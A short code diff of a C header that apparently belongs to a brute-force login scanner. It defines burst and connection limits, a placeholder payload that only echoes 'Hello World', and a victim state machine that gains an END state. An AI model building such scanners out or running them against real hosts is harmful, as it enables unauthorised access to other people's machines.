@@ -1,13 +1,11 @@
 #pragma once
 
 #define SCAN_SCANNER_BURST 2000 // How many packets to send out each burst
-#define SCAN_SCANNER_ERRMAX 30000 // Max amount of errors before _exit(0);
 #define SCAN_SCANNER_MAXCON 10 // Maximum connections
 #define SCAN_SCANNER_SEC 5
 #define SCAN_SCANNER_USEC 0
 #define SCAN_SCANNER_PAYLOAD "echo Hello World!\r\n"
 
-// Need static as it's only in this function
 #define usersize (sizeof(usernames) / sizeof(unsigned char *))
 #define passsize (sizeof(passwords) / sizeof(unsigned char *))
 
@@ -82,6 +80,7 @@ struct scan_victim
 		PASSWORD,
 		PAYLOAD,
 		FINISHED,
+		END,
 	} state;
 	int32_t sock;
 	uint8_t user;
